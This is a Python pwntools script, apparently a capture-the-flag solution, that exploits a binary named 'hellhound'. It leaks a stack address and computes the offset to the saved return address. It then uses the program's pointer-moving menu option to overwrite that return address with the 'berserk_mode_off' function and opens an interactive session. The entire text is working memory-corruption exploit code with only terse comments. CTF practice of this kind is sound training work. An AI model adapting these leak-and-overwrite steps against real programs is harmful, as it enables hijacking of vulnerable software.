from pwn import *
import os 
os.system('clear')

def start(argv=[], *a, **kw):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

exe = './hellhound'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'DEBUG'

sh = start()
sh.sendlineafter(b'>', b'1')
sh.recvuntil(b': [')
get = sh.recvline().strip()
leaked = get[:15]
leaked = int(leaked)
log.success(f'LEAKED STACK ADDRESS --> {hex(leaked)}')

rip = 80 # 64 (malloc) + canary + choice
ret_addr = leaked + rip
log.info(f'RET ADDRESS --> {hex(ret_addr)}')

sh.sendlineafter(b'>', b'2')
p = flat([
    asm('nop') * 8, # padding for 8 bytes moved at option 3
    ret_addr
])
# sh.sendlineafter(b':', p)
sh.sendafter(b': ', p)
sh.sendlineafter(b'>', b'3') # moves chunk pointer 8 bytes, now chunk points to return address.

## FINAL PAYLOAD
pay = flat([
    elf.sym['berserk_mode_off'],
    0x0 # fake chunk
])

sh.sendlineafter(b'>', b'2') 
# sh.sendlineafter(b':', pay) # send payload 
sh.sendafter(b': ', pay)
sh.sendlineafter(b'>', b'3') # moves 8 bytes, now chunk points to fake chunk
sh.sendlineafter(b'>', b'69') # free memory

sh.interactive()
